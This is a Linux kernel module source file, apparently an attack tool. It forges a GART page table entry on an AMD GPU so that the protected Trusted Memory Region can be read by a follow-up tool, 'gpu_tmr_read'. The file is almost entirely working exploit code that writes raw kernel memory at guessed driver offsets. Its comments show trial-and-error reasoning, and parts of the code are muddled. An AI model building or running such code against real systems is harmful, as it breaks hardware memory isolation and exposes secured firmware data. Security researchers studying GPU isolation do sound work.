#include <linux/module.h>
#include <linux/pci.h>
MODULE_LICENSE("GPL");
static void *g_gart_kptr;
static int g_pte_idx = -1;
static u64 g_orig_pte;

static int __init gi_init(void) {
    struct pci_dev *p = pci_get_device(0x1002,0x1586,NULL);
    void *a; int i;
    if (!p) return -ENODEV;
    a=(u8*)pci_get_drvdata(p)-0x10;
    g_gart_kptr = (void*)*(u64*)((u8*)a + 0x3B900 + 0x3B910 - 0x3B910);
    /* Actually: GART kptr at adev+0x3B900... wait, from psp context
     * the GART table was found at adev+0x3AD20 or similar.
     * Let me use the known value from novel_attack output */
    { void *psp = (u8*)a + 0x3B910;
      /* From adev+0x3B908: gpu=0x7FFF00C00000 */
      /* But gart_kptr from novel_attack was 0xFFFFD26E039BF000 */
      /* Let me search for it */
      u64 val = *(u64*)((u8*)a + 0x3AD28); /* try nearby known offsets */
      if ((val >> 48) == 0xFFFF) g_gart_kptr = (void*)(unsigned long)val;
      else {
        /* Search for the GART mc 0x7FFF00C00000 and get kptr */
        int off;
        for (off = 0x3A000; off < 0x3C000; off += 8) {
            u64 v = *(u64*)((u8*)a + off);
            if (v == 0x7FFF00C00000ULL) {
                u64 kp = *(u64*)((u8*)a + off + 8);
                if ((kp >> 48) == 0xFFFF) {
                    g_gart_kptr = (void*)(unsigned long)kp;
                    pr_info("gi: GART kptr at adev+0x%X = %px\n", off+8, g_gart_kptr);
                    break;
                }
            }
        }
      }
    }
    if (!g_gart_kptr) { pr_info("gi: no GART kptr\n"); pci_dev_put(p); return -ENODEV; }

    pr_info("gi: GART kptr = %px\n", g_gart_kptr);

    /* Find free PTE slot */
    for (i = 0; i < 32; i++) {
        u64 pte;
        copy_from_kernel_nofault(&pte, (u8*)g_gart_kptr + i*8, 8);
        if (pte == 0) { g_pte_idx = i; break; }
    }
    if (g_pte_idx < 0) { pr_info("gi: no free PTE\n"); pci_dev_put(p); return -ENODEV; }

    /* Save original and inject TMR PTE */
    copy_from_kernel_nofault(&g_orig_pte, (u8*)g_gart_kptr + g_pte_idx*8, 8);
    { u64 tmr_pte = (0x97E0000000ULL & ~0xFFFULL) | 0x1; /* valid, VRAM */
      copy_to_kernel_nofault((u8*)g_gart_kptr + g_pte_idx*8, &tmr_pte, 8);
    }
    { u64 rb;
      copy_from_kernel_nofault(&rb, (u8*)g_gart_kptr + g_pte_idx*8, 8);
      pr_info("gi: PTE[%d] = 0x%016llX → TMR at GART VA 0x%llX\n",
          g_pte_idx, rb, 0x7FFF00000ULL + g_pte_idx * 0x1000);
    }
    pr_info("gi: GART PTE INJECTED. Run gpu_tmr_read now.\n");

    pci_dev_put(p);
    return 0;
}
static void __exit gi_exit(void) {
    if (g_gart_kptr && g_pte_idx >= 0) {
        copy_to_kernel_nofault((u8*)g_gart_kptr + g_pte_idx*8, &g_orig_pte, 8);
        pr_info("gi: PTE restored\n");
    }
    pr_info("gi: unloaded\n");
}
module_init(gi_init); module_exit(gi_exit);
